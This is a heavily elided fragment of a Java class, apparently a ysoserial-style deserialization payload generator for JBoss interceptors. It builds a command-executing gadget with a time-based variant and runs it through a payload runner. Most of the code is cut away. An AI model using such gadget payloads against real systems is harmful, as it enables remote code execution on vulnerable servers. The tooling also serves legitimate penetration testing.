...
public class JBossInterceptors1Time implements ObjectPayload<Object> {
    ...
    public Object getObject(final String command) throws Exception {
        ...
        final Object gadget = Gadgets.createTemplatesImplTime(command);
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JBossInterceptors1Time.class, args);
    }
}
